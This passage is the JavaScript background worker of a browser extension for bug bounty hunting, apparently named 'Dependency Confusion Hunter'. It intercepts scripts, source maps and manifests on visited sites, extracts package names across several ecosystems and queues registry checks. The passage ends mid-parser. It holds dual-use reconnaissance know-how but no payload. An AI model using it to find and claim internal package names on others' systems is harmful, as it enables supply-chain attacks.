// Dependency Confusion Hunter - Background Service Worker
// Author: OFJAAAH

let findings = [];
let history = []; // Historical findings
let processedUrls = new Set();
let checkedPackages = new Set(); // Track already checked packages
let config = {
  discordWebhook: '',
  proxyUrl: '',
  autoCheck: true,
  notificationsEnabled: true,
  npmToken: '',
  npmRegistry: 'https://registry.npmjs.org',
  npmAuthEnabled: false,
  showScopedPackages: true, // Show scoped packages for bug bounty
  enableHistory: true,
  analyzeBundles: false, // Analyze bundled code (disabled by default - high false positive rate)
  analyzeManifests: true, // Analyze package.json, requirements.txt, etc.
  analyzeLockfiles: true, // Analyze lock files (yarn.lock, package-lock.json, etc.)
  ignoreKnownDomains: true, // Ignore Meta/Google/etc domains by default
  customIgnoredDomains: [], // User-defined domains to ignore
  minConfidence: 70, // Minimum confidence to show findings (0-100)
  strictMode: true, // Only show high-confidence findings
  // New ecosystem settings
  enableRubyGems: true,
  enableCargo: true,
  enableNuGet: true,
  enableMaven: true,
  enableGo: true,       // Go modules (pkg.go.dev)
  enableComposer: true, // PHP Composer (packagist.org)
  rateLimitDelay: 100 // Delay between registry checks in ms (100ms = 10 req/sec max)
};

// Rate limiter to prevent IP blocking from registries
const rateLimiter = {
  queue: [],
  processing: false,
  lastRequestTime: 0,

  async add(fn) {
    return new Promise((resolve, reject) => {
      this.queue.push({ fn, resolve, reject });
      this.process();
    });
  },

  async process() {
    if (this.processing || this.queue.length === 0) return;
    this.processing = true;

    const { fn, resolve, reject } = this.queue.shift();

    // Ensure minimum delay between requests
    const now = Date.now();
    const timeSinceLastRequest = now - this.lastRequestTime;
    const delay = config.rateLimitDelay || 100;

    if (timeSinceLastRequest < delay) {
      await new Promise(r => setTimeout(r, delay - timeSinceLastRequest));
    }

    try {
      this.lastRequestTime = Date.now();
      const result = await fn();
      resolve(result);
    } catch (e) {
      reject(e);
    }

    this.processing = false;
    // Process next item in queue
    if (this.queue.length > 0) {
      setTimeout(() => this.process(), 0);
    }
  }
};

// Built-in Node.js modules to ignore
const NODE_BUILTINS = [
  'assert', 'async_hooks', 'buffer', 'child_process', 'cluster', 'console',
  'constants', 'crypto', 'dgram', 'dns', 'domain', 'events', 'fs', 'http',
  'http2', 'https', 'inspector', 'module', 'net', 'os', 'path', 'perf_hooks',
  'process', 'punycode', 'querystring', 'readline', 'repl', 'stream', 'string_decoder',
  'sys', 'timers', 'tls', 'trace_events', 'tty', 'url', 'util', 'v8', 'vm',
  'wasi', 'worker_threads', 'zlib'
];

// Common public packages to ignore (reduce false positives)
const COMMON_PACKAGES = [
  'react', 'react-dom', 'vue', 'angular', 'jquery', 'lodash', 'axios',
  'express', 'webpack', 'babel', 'eslint', 'prettier', 'typescript',
  'next', 'nuxt', 'vite', 'rollup', 'parcel', 'gatsby', 'redux',
  'moment', 'dayjs', 'date-fns', 'ramda', 'underscore', 'immutable',
  'cordova', 'phonegap', 'ionic', 'capacitor', // Mobile frameworks
  'bootstrap', 'tailwindcss', 'material-ui', 'antd', // UI frameworks
  'jest', 'mocha', 'chai', 'jasmine', 'karma', // Testing frameworks
  'commander', 'yargs', 'chalk', 'colors', // CLI tools
  'body-parser', 'cors', 'dotenv', 'morgan', // Express middleware
  'socket.io', 'ws', 'mqtt', // WebSocket/messaging
  'mongoose', 'sequelize', 'typeorm', 'prisma', // ORMs
  'bcrypt', 'jsonwebtoken', 'passport', 'crypto-js', // Security
  'sharp', 'jimp', 'canvas', // Image processing
  'cheerio', 'puppeteer', 'playwright', // Web scraping
  'nodemon', 'pm2', 'concurrently', // Process management
  'glob', 'rimraf', 'mkdirp', 'fs-extra' // File system utilities
];

// Domains to ignore (these have lots of internal modules that generate false positives)
const IGNORED_DOMAINS = [
  'instagram.com',
  'facebook.com',
  'fb.com',
  'meta.com',
  'whatsapp.com',
  'messenger.com',
  'threads.net',
  'oculus.com',
  'workplace.com',
  // Google properties
  'google.com',
  'youtube.com',
  'googleapis.com',
  // Other major sites with heavy bundling
  'twitter.com',
  'x.com',
  'linkedin.com',
  'tiktok.com',
  'snapchat.com',
  'pinterest.com',
  'reddit.com',
  'amazon.com',
  'netflix.com',
  'spotify.com',
  'discord.com',
  'twitch.tv',
  'microsoft.com',
  'apple.com',
  'adobe.com'
];

// Known internal module prefixes from bundled code (Meta/Facebook, Google, etc.)
const INTERNAL_MODULE_PREFIXES = [
  'lexical',       // Lexical editor framework (Meta)
  'react',         // React internals
  'falco',         // Meta internal logging
  'relay',         // Relay GraphQL framework (Meta)
  'fbjs',          // Facebook JavaScript utilities
  'fbt',           // Facebook translation system
  'fbs',           // Facebook internal
  'fbid',          // Facebook ID system
  'graphql',       // GraphQL internals
  'jest',          // Jest internals
  'scheduler',     // React scheduler
  'workbox',       // Google Workbox
  'webpack',       // Webpack runtime
  'polyfill',      // Polyfills
  'regenerator',   // Babel regenerator
  'core-js',       // Core-js polyfills
  'babel-runtime', // Babel runtime
  'tslib',         // TypeScript lib
  'instagram',     // Instagram internal modules
  'igsrc',         // Instagram source
  'igcdn',         // Instagram CDN
  'fb-',           // Facebook prefix
  'ig-',           // Instagram prefix
  'meta-',         // Meta prefix
  'xig',           // Instagram internal
  'polarisnavigation', // Instagram navigation
  'polaris',       // Instagram framework
  'barcelona',     // Threads internal
  'bloks',         // Meta Bloks framework
  'rsrc',          // Meta resources
  'qpl',           // Meta QPL
  'mwax',          // Meta internal
  'lsdid',         // Meta internal
  'comet',         // Facebook Comet framework
  'mercury',       // Facebook Messenger internal
  'sticker',       // Meta stickers
  'story',         // Meta stories
  'reel',          // Meta reels
  'reels'          // Meta reels
];

// Known internal module patterns (case-insensitive)
const INTERNAL_MODULE_PATTERNS = [
  /^lexical/i,           // LexicalComposerContext, LexicalHTML, etc.
  /^use[A-Z]/,           // React hooks: useLexicalEditable, useState, etc.
  /internal/i,           // FalcoLoggerInternalState, etc.
  /^falco/i,             // Falco* modules (Meta internal)
  /^fb[A-Z_]/i,          // FB* modules (Facebook)
  /^fbs[A-Z_]/i,         // FBS* modules (Facebook)
  /^fbt[A-Z_]/i,         // FBT* modules (Facebook)
  /^ig[A-Z_]/i,          // IG* modules (Instagram)
  /^xig/i,               // XIG* modules (Instagram)
  /state$/i,             // *State modules (often internal)
  /context$/i,           // *Context modules (often internal)
  /provider$/i,          // *Provider modules (often internal)
  /^react[A-Z]/i,        // ReactDOM, ReactFiberNode, etc.
  /extension$/i,         // *Extension modules (often internal)
  /^scheduler/i,         // React scheduler internals
  /^relay/i,             // Relay internals
  /utils$/i,             // *Utils (too generic)
  /helpers$/i,           // *Helpers (too generic)
  /runtime$/i,           // *Runtime modules
  /polyfill/i,           // Polyfill modules
  /^webpack[A-Z]/i,      // Webpack internals
  /^_[a-z]/i,            // Private modules starting with underscore
  /logger$/i,            // Logger modules
  /constants$/i,         // Constants modules (too generic)
  /config$/i,            // Config modules (too generic)
  /handler$/i,           // Handler modules (too generic)
  /manager$/i,           // Manager modules (too generic)
  /^polaris/i,           // Instagram Polaris framework
  /^barcelona/i,         // Threads internal
  /^bloks/i,             // Meta Bloks
  /^comet/i,             // Facebook Comet
  /^mercury/i,           // Facebook Messenger
  /^qpl/i,               // Meta QPL
  /^rsrc/i,              // Meta resources
  /^lsd/i,               // Meta LSD
  /^mwax/i,              // Meta internal
  /^css[A-Z_]/i,         // CSS modules
  /^html[A-Z_]/i,        // HTML modules
  /^dom[A-Z_]/i,         // DOM modules
  /^event[A-Z_]/i,       // Event modules
  /^animation/i,         // Animation modules
  /^gesture/i,           // Gesture modules
  /^navigation/i,        // Navigation modules
  /^modal/i,             // Modal modules
  /^dialog/i,            // Dialog modules
  /^tooltip/i,           // Tooltip modules
  /^menu/i,              // Menu modules
  /^button/i,            // Button modules
  /^icon/i,              // Icon modules
  /^image/i,             // Image modules
  /^video/i,             // Video modules
  /^audio/i,             // Audio modules
  /^player/i,            // Player modules
  /^feed/i,              // Feed modules
  /^post/i,              // Post modules
  /^comment/i,           // Comment modules
  /^like/i,              // Like modules
  /^share/i,             // Share modules
  /^follow/i,            // Follow modules
  /^profile/i,           // Profile modules
  /^user/i,              // User modules
  /^account/i,           // Account modules
  /^auth/i,              // Auth modules
  /^login/i,             // Login modules
  /^logout/i,            // Logout modules
  /^session/i,           // Session modules
  /^token/i,             // Token modules
  /^api/i,               // API modules
  /^endpoint/i,          // Endpoint modules
  /^request/i,           // Request modules
  /^response/i,          // Response modules
  /^fetch/i,             // Fetch modules
  /^xhr/i,               // XHR modules
  /^ajax/i,              // AJAX modules
  /^http/i,              // HTTP modules
  /^socket/i,            // Socket modules
  /^websocket/i,         // WebSocket modules
  /^storage/i,           // Storage modules
  /^cache/i,             // Cache modules
  /^cookie/i,            // Cookie modules
  /^local/i,             // Local modules
  /component$/i,         // *Component modules
  /service$/i,           // *Service modules
  /factory$/i,           // *Factory modules
  /adapter$/i,           // *Adapter modules
  /wrapper$/i,           // *Wrapper modules
  /container$/i,         // *Container modules
  /controller$/i,        // *Controller modules
  /reducer$/i,           // *Reducer modules
  /action$/i,            // *Action modules
  /selector$/i,          // *Selector modules
  /hook$/i,              // *Hook modules
  /effect$/i,            // *Effect modules
  /ref$/i,               // *Ref modules
  /memo$/i               // *Memo modules
];

// Python built-in modules
const PYTHON_BUILTINS = [
  'os', 'sys', 'json', 'time', 'datetime', 're', 'math', 'random', 'collections',
  'itertools', 'functools', 'urllib', 'http', 'socket', 'threading', 'multiprocessing',
  'subprocess', 'argparse', 'logging', 'unittest', 'pickle', 'csv', 'xml', 'email',
  'base64', 'hashlib', 'hmac', 'uuid', 'copy', 'io', 'pathlib', 'shutil', 'tempfile'
];

// Ruby standard library modules
const RUBY_STDLIB = [
  'base64', 'benchmark', 'bigdecimal', 'cgi', 'csv', 'date', 'digest', 'drb',
  'erb', 'fileutils', 'find', 'forwardable', 'io-console', 'ipaddr', 'irb',
  'json', 'logger', 'matrix', 'minitest', 'mutex_m', 'net-ftp', 'net-http',
  'net-imap', 'net-pop', 'net-smtp', 'observer', 'open-uri', 'open3', 'openssl',
  'optparse', 'ostruct', 'pathname', 'pp', 'prettyprint', 'pstore', 'psych',
  'racc', 'rdoc', 'readline', 'reline', 'resolv', 'rexml', 'rinda', 'ripper',
  'rss', 'securerandom', 'set', 'shellwords', 'singleton', 'socket', 'stringio',
  'strscan', 'tempfile', 'time', 'timeout', 'tmpdir', 'tsort', 'un', 'uri',
  'weakref', 'webrick', 'yaml', 'zlib', 'bundler', 'rake', 'rubygems',
  'rails', 'activerecord', 'activesupport', 'actionpack', 'actionview', 'actionmailer'
];

// Rust standard library crates
const RUST_STDLIB = [
  'std', 'core', 'alloc', 'proc_macro', 'test', 'collections', 'panic_abort',
  'panic_unwind', 'unwind', 'rustc_std_workspace_core', 'rustc_std_workspace_alloc'
];

// Common public gems to ignore (reduce false positives)
const COMMON_GEMS = [
  'rails', 'bundler', 'rake', 'rspec', 'rubocop', 'puma', 'sidekiq', 'redis',
  'pg', 'mysql2', 'sqlite3', 'devise', 'omniauth', 'pundit', 'cancancan',
  'activeadmin', 'carrierwave', 'paperclip', 'shrine', 'kaminari', 'pagy',
  'ransack', 'friendly_id', 'slim', 'haml', 'sass-rails', 'webpacker', 'turbo-rails',
  'stimulus-rails', 'importmap-rails', 'sprockets', 'jbuilder', 'oj', 'multi_json'
];

// Common public crates to ignore
const COMMON_CRATES = [
  'serde', 'tokio', 'async-std', 'reqwest', 'hyper', 'actix-web', 'rocket',
  'diesel', 'sqlx', 'sea-orm', 'clap', 'structopt', 'log', 'env_logger', 'tracing',
  'anyhow', 'thiserror', 'rand', 'chrono', 'uuid', 'regex', 'lazy_static', 'once_cell',
  'futures', 'async-trait', 'bytes', 'parking_lot', 'crossbeam', 'rayon', 'itertools'
];

// Common NuGet packages to ignore
const COMMON_NUGET = [
  'Newtonsoft.Json', 'Microsoft.Extensions.DependencyInjection', 'Microsoft.Extensions.Logging',
  'Microsoft.AspNetCore.Mvc', 'Microsoft.EntityFrameworkCore', 'AutoMapper', 'Dapper',
  'Serilog', 'FluentValidation', 'MediatR', 'Polly', 'Moq', 'xunit', 'NUnit',
  'Swashbuckle.AspNetCore', 'System.Text.Json', 'Microsoft.Extensions.Configuration'
];

// Common Maven packages to ignore
const COMMON_MAVEN = [
  'spring-boot', 'spring-core', 'spring-web', 'spring-data', 'hibernate', 'jackson',
  'lombok', 'slf4j', 'log4j', 'junit', 'mockito', 'guava', 'commons-lang3',
  'commons-io', 'commons-collections', 'gson', 'okhttp', 'retrofit', 'netty'
];

// JavaScript/Programming reserved words and common strings
const RESERVED_WORDS = [
  // JavaScript keywords
  'abstract', 'arguments', 'await', 'boolean', 'break', 'byte', 'case', 'catch',
  'char', 'class', 'const', 'continue', 'debugger', 'default', 'delete', 'do',
  'double', 'else', 'enum', 'eval', 'export', 'extends', 'false', 'final',
  'finally', 'float', 'for', 'function', 'goto', 'if', 'implements', 'import',
  'in', 'instanceof', 'int', 'interface', 'let', 'long', 'native', 'new',
  'null', 'package', 'private', 'protected', 'public', 'return', 'short', 'static',
  'super', 'switch', 'synchronized', 'this', 'throw', 'throws', 'transient', 'true',
  'try', 'typeof', 'var', 'void', 'volatile', 'while', 'with', 'yield',

  // Common programming terms
  'abort', 'abstract', 'as', 'async', 'call', 'callback', 'class', 'constructor',
  'data', 'default', 'define', 'element', 'error', 'event', 'exports', 'extends',
  'from', 'function', 'get', 'global', 'id', 'index', 'info', 'init', 'item',
  'key', 'length', 'load', 'map', 'method', 'module', 'name', 'node', 'object',
  'options', 'params', 'parent', 'prototype', 'require', 'result', 'return',
  'self', 'set', 'state', 'status', 'string', 'target', 'test', 'type', 'undefined',
  'using', 'value', 'values', 'version', 'window',

  // TypeScript/C/C++ specific
  'dllexport', 'dllimport', 'incdir', 'specint', 'typedef', 'unsigned', 'virtual',
  'friend', 'namespace', 'template', 'typename', 'explicit', 'mutable', 'operator',
  'register', 'signed', 'sizeof', 'struct', 'union', 'auto', 'extern', 'restrict',
  'inline', 'asm', 'bool', 'complex', 'imaginary', 'noreturn', 'alignas', 'alignof',

  // Java/Kotlin
  'enherits', 'inherits', 'java', 'kotlin', 'abstract', 'assert', 'strictfp',
  'volatile', 'transient', 'native', 'synchronized',

  // Common short words
  'an', 'at', 'be', 'by', 'do', 'es', 'go', 'in', 'is', 'it', 'no', 'of', 'on',
  'or', 'to', 'up', 'us', 'we', 'am', 'are', 'was', 'has', 'had', 'can', 'may',

  // Common numbers and ports
  '80', '443', '8080', '3000', '5000', '8000', '9000', '8443', '5432', '3306', '27017',

  // Other common non-package strings
  'refer', 'refers', 'contains', 'includes', 'extends', 'implements', 'non_intrinsic',

  // Common generic suffixes/prefixes
  'text', 'html', 'selection', 'clipboard', 'dragon', 'history', 'plain', 'editable',
  'composer', 'editor', 'dom', 'node', 'element'
];

// CSS properties and HTML attributes blacklist
const CSS_HTML_PATTERNS = [
  // CSS properties
  /^(stroke|fill|padding|margin|border|font|color|background|display|position|flex|grid|align|justify|width|height|top|left|right|bottom|opacity|transform|transition|animation|cursor|overflow|z-index|text|line|letter|word)-/i,

  // HTML/ARIA attributes
  /^(aria|data|ng|v-|:|\[|@)/i,

  // Common CSS property patterns
  /^(webkit|moz|ms|o)-/i,
];

// Check if string matches CSS/HTML patterns
function isCssHtmlProperty(name) {
  if (!name) return false;

  // Check against CSS/HTML patterns
  for (const pattern of CSS_HTML_PATTERNS) {
    if (pattern.test(name)) {
      return true;
    }
  }

  // Specific CSS/HTML strings
  const cssHtmlStrings = [
    'stroke-width', 'stroke-miterlimit', 'stroke-opacity', 'stroke-dasharray',
    'stroke-dashoffset', 'stroke-linecap', 'stroke-linejoin', 'fill-opacity',
    'fill-rule', 'font-size', 'font-family', 'font-weight', 'font-style',
    'text-align', 'text-decoration', 'text-transform', 'line-height',
    'padding-left', 'padding-right', 'padding-top', 'padding-bottom',
    'margin-left', 'margin-right', 'margin-top', 'margin-bottom',
    'border-width', 'border-style', 'border-color', 'border-radius',
    'background-color', 'background-image', 'background-size',
    'aria-valuemin', 'aria-valuemax', 'aria-valuenow', 'aria-label',
    'aria-labelledby', 'aria-describedby', 'aria-hidden', 'aria-level',
    'aria-expanded', 'aria-selected', 'aria-checked', 'aria-pressed',
    'data-id', 'data-value', 'data-name', 'data-type', 'data-index'
  ];

  return cssHtmlStrings.includes(name.toLowerCase());
}

// Check if URL belongs to an ignored domain
function isIgnoredDomain(url) {
  if (!url) return false;

  try {
    const urlObj = new URL(url);
    const hostname = urlObj.hostname.toLowerCase();

    // Check custom ignored domains from config
    if (config.customIgnoredDomains && Array.isArray(config.customIgnoredDomains)) {
      for (const domain of config.customIgnoredDomains) {
        if (hostname === domain || hostname.endsWith('.' + domain)) {
          return true;
        }
      }
    }

    // Check if ignoreKnownDomains is disabled
    if (config.ignoreKnownDomains === false) {
      return false;
    }

    // Check against built-in ignored domains
    for (const domain of IGNORED_DOMAINS) {
      if (hostname === domain || hostname.endsWith('.' + domain)) {
        return true;
      }
    }

    return false;
  } catch (e) {
    return false;
  }
}

// Check if package name looks like an internal/bundled module
function looksLikeInternalModule(name) {
  if (!name) return false;

  // Camel case with capital letters in middle (internal module naming)
  // e.g., "LexicalComposerContext", "FalcoLoggerInternalState"
  if (/^[A-Z][a-z]+[A-Z]/.test(name)) {
    return true;
  }

  // Contains underscore followed by capital (internal naming)
  if (/_[A-Z]/.test(name)) {
    return true;
  }

  // Very long names are often internal modules
  if (name.length > 40) {
    return true;
  }

  // Contains numbers mixed with letters in unusual ways
  if (/[a-z]\d+[a-z]/i.test(name)) {
    return true;
  }

  return false;
}

// Load configuration on startup
chrome.storage.local.get(['config', 'findings', 'history'], (result) => {
  if (result.config) {
    config = { ...config, ...result.config };
  }
  if (result.findings) {
    findings = result.findings;
  }
  if (result.history) {
    history = result.history;
  }
  updateBadge();
});

// Listen for web requests to intercept JS, .map, and manifest files
chrome.webRequest.onCompleted.addListener(
  (details) => {
    const url = details.url;

    // Skip chrome-extension:// URLs and other non-http(s) URLs
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      return;
    }

    // Skip ignored domains (Meta, Google, etc.)
    if (isIgnoredDomain(url)) {
      return;
    }

    // Process different file types
    const isJsOrMap = url.match(/\.(js|map)(\?|$)/i);
    const isManifest = config.analyzeManifests && url.match(/(package\.json|requirements\.txt|Pipfile|Gemfile|composer\.json|go\.mod|Cargo\.toml)(\?|$)/i);
    const isLockfile = config.analyzeLockfiles && url.match(/(package-lock\.json|yarn\.lock|pnpm-lock\.yaml|Pipfile\.lock|Gemfile\.lock|composer\.lock|go\.sum|Cargo\.lock)(\?|$)/i);

    if (!isJsOrMap && !isManifest && !isLockfile) return;

    // Avoid processing same URL multiple times
    if (processedUrls.has(url)) return;
    processedUrls.add(url);

    // Fetch and analyze the file
    analyzeFile(url, details.tabId);
  },
  { urls: ["<all_urls>"] }
);

// Analyze file content for package dependencies
async function analyzeFile(url, tabId) {
  // Skip non-http(s) URLs
  if (!url.startsWith('http://') && !url.startsWith('https://')) {
    return;
  }

  try {
    // Note: Proxy configuration in browser extensions is handled at the browser level
    // The proxyUrl config is available for reference but not used in fetch()
    const response = await fetchWithTimeout(url, {}, 15000); // 15 second timeout for file downloads
    const content = await response.text();

    // Detect file type based on URL and content
    const fileType = detectFileType(url, content);

    // Extract package names
    const packages = extractPackages(content, url, fileType);

    if (packages.length > 0) {
      console.log(`[Dependency Hunter] Found ${packages.length} packages in ${url}`);

      // Check if packages exist
      for (const pkg of packages) {
        await checkPackageExists(pkg, url, tabId);
      }
    }
  } catch (error) {
    // Only log errors for URLs that look like they should work
    if (url.startsWith('http://127.0.0.1') || url.startsWith('http://localhost')) {
      console.debug(`[Dependency Hunter] Error analyzing ${url}:`, error.message);
    }
    // Continue processing - don't let one failed file break the entire extension
  }
}

// Detect file type (JavaScript/TypeScript vs Python vs Manifest)
function detectFileType(url, content) {
  // Check for manifest files (100% reliable sources)
  if (url.match(/package\.json$/i)) return 'package.json';
  if (url.match(/package-lock\.json$/i)) return 'package-lock.json';
  if (url.match(/yarn\.lock$/i)) return 'yarn.lock';
  if (url.match(/pnpm-lock\.yaml$/i)) return 'pnpm-lock.yaml';
  if (url.match(/requirements\.txt$/i)) return 'requirements.txt';
  if (url.match(/Pipfile$/i)) return 'Pipfile';
  if (url.match(/Pipfile\.lock$/i)) return 'Pipfile.lock';
  if (url.match(/Gemfile$/i)) return 'Gemfile';
  if (url.match(/Gemfile\.lock$/i)) return 'Gemfile.lock';
  if (url.match(/composer\.json$/i)) return 'composer.json';
  if (url.match(/composer\.lock$/i)) return 'composer.lock';
  if (url.match(/go\.mod$/i)) return 'go.mod';
  if (url.match(/go\.sum$/i)) return 'go.sum';
  if (url.match(/Cargo\.toml$/i)) return 'Cargo.toml';
  if (url.match(/Cargo\.lock$/i)) return 'Cargo.lock';
  // NuGet (.NET) manifest files
  if (url.match(/\.csproj$/i)) return 'csproj';
  if (url.match(/\.fsproj$/i)) return 'fsproj';
  if (url.match(/\.vbproj$/i)) return 'vbproj';
  if (url.match(/packages\.config$/i)) return 'packages.config';
  if (url.match(/\.nuspec$/i)) return 'nuspec';
  // Maven (Java) manifest files
  if (url.match(/pom\.xml$/i)) return 'pom.xml';
  if (url.match(/build\.gradle$/i)) return 'build.gradle';
  if (url.match(/build\.gradle\.kts$/i)) return 'build.gradle.kts';
  // Source maps
  if (url.match(/\.map$/i)) return 'sourcemap';

  // Check URL extension for code files
  if (url.match(/\.py$/i)) return 'python';
  if (url.match(/\.(js|jsx|ts|tsx|mjs|cjs|map)$/i)) return 'javascript';

  // Analyze content for Python indicators
  const pythonIndicators = [
    /^import\s+\w+$/m,
    /^from\s+\w+\s+import/m,
    /def\s+\w+\s*\(/,
    /class\s+\w+\s*:/,
    /__init__\.py/,
    /pip\s+install/,
    /#!\s*\/usr\/bin\/(env\s+)?python/
  ];

  // JavaScript indicators
  const jsIndicators = [
    /\bconst\s+\w+\s*=/,
    /\blet\s+\w+\s*=/,
    /\bvar\s+\w+\s*=/,
    /function\s*\(/,
    /=>\s*{/,
    /module\.exports/,
    /export\s+(default|const|function|class)/,
    /require\s*\(/,
    /__webpack/,
    /sourceMappingURL/
  ];

  let pythonScore = 0;
  let jsScore = 0;

  pythonIndicators.forEach(pattern => {
    if (pattern.test(content)) pythonScore++;
  });

  jsIndicators.forEach(pattern => {
    if (pattern.test(content)) jsScore++;
  });

  // If JavaScript score is higher, it's JavaScript
  if (jsScore > pythonScore) return 'javascript';

  // If Python score is higher, it's Python
  if (pythonScore > jsScore) return 'python';

  // Default to JavaScript for .js/.map files
  return 'javascript';
}

// Helper function to extract code snippet around a match
function extractCodeSnippet(content, matchIndex, matchLength, contextLines = 3) {
  const lines = content.split('\n');
  let currentPos = 0;
  let lineNumber = 0;

  // Find which line the match is on
  for (let i = 0; i < lines.length; i++) {
    if (currentPos + lines[i].length >= matchIndex) {
      lineNumber = i;
      break;
    }
    currentPos += lines[i].length + 1; // +1 for newline
  }

  // Get context lines before and after
  const startLine = Math.max(0, lineNumber - contextLines);
  const endLine = Math.min(lines.length - 1, lineNumber + contextLines);

  const snippetLines = [];
  for (let i = startLine; i <= endLine; i++) {
    snippetLines.push({
      lineNumber: i + 1,
      content: lines[i],
      isMatch: i === lineNumber
    });
  }

  return {
    snippet: snippetLines,
    matchLine: lineNumber + 1,
    matchedText: content.substr(matchIndex, matchLength)
  };
}

// Check if content looks like bundled/minified code (high chance of false positives)
function isBundledOrMinified(content) {
  // If analyzeBundles is enabled, don't skip bundles
  if (config.analyzeBundles) {
    return false;
  }

  // Check for webpack/bundle indicators
  const bundleIndicators = [
    /__webpack_require__/,
    /webpackChunk/,
    /\(function\s*\(\s*modules?\s*\)\s*{/,  // IIFE bundle pattern
    /\/\*\s*\d+\s*\*\//,                      // Numbered comments in bundles
    /"use strict";.*?"use strict";/s,        // Multiple "use strict"
    /;(function|var|let|const)\([a-z]\)/     // Minified pattern
  ];

  for (const indicator of bundleIndicators) {
    if (indicator.test(content)) {
      return true;
    }
  }

  // Check for high concentration of module definitions (Meta/FB bundles)
  // These bundles define modules with numeric IDs like __d("ModuleName", ...)
  const moduleDefCount = (content.match(/__d\s*\(\s*["'][^"']+["']/g) || []).length;
  if (moduleDefCount > 10) {
    return true;
  }

  return false;
}

// Extract package names from content
function extractPackages(content, sourceUrl, fileType = 'javascript') {
  const packageNames = new Map(); // Use Map to deduplicate by name+type

  // Extract from package.json (100% reliable - NO false positives)
  if (fileType === 'package.json') {
    try {
      const pkgJson = JSON.parse(content);
      const deps = { ...pkgJson.dependencies, ...pkgJson.devDependencies, ...pkgJson.peerDependencies, ...pkgJson.optionalDependencies };

      for (const [name, version] of Object.entries(deps)) {
        if (name && isValidPackageName(name)) {
          packageNames.set(`npm:${name}`, {
            name,
            type: 'npm',
            source: sourceUrl,
            codeSnippet: [{ lineNumber: 1, content: `"${name}": "${version}"`, isMatch: true }],
            matchLine: 1,
            matchedText: `"${name}": "${version}"`,
            confidence: 100 // 100% confidence from package.json
          });
        }
      }
    } catch (e) {
      console.error('[Dependency Hunter] Error parsing package.json:', e);
    }
    return Array.from(packageNames.values());
  }

  // Extract from package-lock.json (100% reliable)
  if (fileType === 'package-lock.json') {
    try {
      const lockJson = JSON.parse(content);
      const packages = lockJson.packages || lockJson.dependencies || {};

      for (const [path, info] of Object.entries(packages)) {
        // Extract package name from path (e.g., "node_modules/lodash" -> "lodash")
        const name = path.replace(/^node_modules\//, '').split('/node_modules/').pop();
        if (name && name !== '' && isValidPackageName(name)) {
          packageNames.set(`npm:${name}`, {
            name,
            type: 'npm',
            source: sourceUrl,
            codeSnippet: [{ lineNumber: 1, content: `"${name}"`, isMatch: true }],
            matchLine: 1,
            matchedText: name,
            confidence: 100
          });
        }
      }
    } catch (e) {
      console.error('[Dependency Hunter] Error parsing package-lock.json:', e);
    }
    return Array.from(packageNames.values());
  }

  // Extract from yarn.lock (100% reliable)
  if (fileType === 'yarn.lock') {
    // yarn.lock format: package-name@version:
    const yarnPattern = /^"?([^@\s]+(?:@[^\/\s]+\/[^@\s]+)?)"?@/gm;
    let match;
    while ((match = yarnPattern.exec(content)) !== null) {
      const name = match[1].replace(/^["']|["']$/g, '');
      if (name && isValidPackageName(name)) {
        packageNames.set(`npm:${name}`, {
          name,
          type: 'npm',
          source: sourceUrl,
          codeSnippet: [{ lineNumber: 1, content: match[0], isMatch: true }],
          matchLine: 1,
          matchedText: match[0],
          confidence: 100
        });
      }
    }
    return Array.from(packageNames.values());
  }

  // Extract from requirements.txt (100% reliable)
  if (fileType === 'requirements.txt') {
    const lines = content.split('\n');
    lines.forEach((line, idx) => {
      // Remove comments and whitespace
      const cleaned = line.split('#')[0].trim();
      if (!cleaned) return;

      // Extract package name (before ==, >=, etc.)
      const match = cleaned.match(/^([a-zA-Z0-9][a-zA-Z0-9_-]*)/);
      if (match) {
        const name = match[1].toLowerCase();
        if (isValidPythonPackageName(name)) {
          packageNames.set(`pip:${name}`, {
            name,
            type: 'pip',
            source: sourceUrl,
            codeSnippet: [{ lineNumber: idx + 1, content: line, isMatch: true }],
            matchLine: idx + 1,
            matchedText: line,
            confidence: 100
          });
        }
      }
    });
    return Array.from(packageNames.values());
  }

  // Extract from Gemfile (Ruby - 100% reliable)
  if (fileType === 'Gemfile') {
    const lines = content.split('\n');
    lines.forEach((line, idx) => {
      // Remove comments and whitespace
      const cleaned = line.split('#')[0].trim();
      if (!cleaned) return;

      // Match gem 'name' or gem "name"
      const match = cleaned.match(/^\s*gem\s+['"]([a-zA-Z0-9_-]+)['"]/);
      if (match) {
        const name = match[1].toLowerCase();
        if (isValidGemName(name)) {
          packageNames.set(`gem:${name}`, {
            name,
            type: 'gem',
            source: sourceUrl,
            codeSnippet: [{ lineNumber: idx + 1, content: line, isMatch: true }],
            matchLine: idx + 1,
            matchedText: line,
            confidence: 100
          });
        }
      }
    });
    return Array.from(packageNames.values());
  }

  // Extract from Gemfile.lock (Ruby - 100% reliable)
  if (fileType === 'Gemfile.lock') {
    // Gemfile.lock format: specs section contains gem names with indentation
    const specsMatch = content.match(/specs:\n([\s\S]*?)(?=\n\S|$)/);
    if (specsMatch) {
      const specsLines = specsMatch[1].split('\n');
      specsLines.forEach((line, idx) => {
        // Match indented gem name (4 spaces) - e.g., "    gem-name (1.0.0)"
        const match = line.match(/^\s{4}([a-zA-Z0-9_-]+)\s+\(/);
        if (match) {
          const name = match[1].toLowerCase();
          if (isValidGemName(name)) {
            packageNames.set(`gem:${name}`, {
              name,
              type: 'gem',
              source: sourceUrl,
              codeSnippet: [{ lineNumber: idx + 1, content: line, isMatch: true }],
              matchLine: idx + 1,
              matchedText: line,
              confidence: 100
            });
          }
        }
      });
    }
    return Array.from(packageNames.values());
  }

  // Extract from Cargo.toml (Rust - 100% reliable)
  if (fileType === 'Cargo.toml') {
    const lines = content.split('\n');
    let inDependencies = false;

    lines.forEach((line, idx) => {
      // Check for dependencies section
      if (line.match(/^\s*\[(.*dependencies.*)\]/i)) {
        inDependencies = true;
        return;
      }
      // New section starts
      if (line.match(/^\s*\[/) && !line.match(/dependencies/i)) {
        inDependencies = false;
        return;
      }

      if (inDependencies) {
        // Match crate-name = "version" or crate-name = { version = "..." }
        const match = line.match(/^\s*([a-zA-Z0-9_-]+)\s*=/);
        if (match) {
          const name = match[1].toLowerCase();
          if (isValidCrateName(name)) {
            packageNames.set(`cargo:${name}`, {
              name,
              type: 'cargo',
              source: sourceUrl,
              codeSnippet: [{ lineNumber: idx + 1, content: line, isMatch: true }],
              matchLine: idx + 1,
              matchedText: line,
              confidence: 100
            });
          }
        }
      }
    });
    return Array.from(packageNames.values());
  }

  // Extract from Cargo.lock (Rust - 100% reliable)
  if (fileType === 'Cargo.lock') {
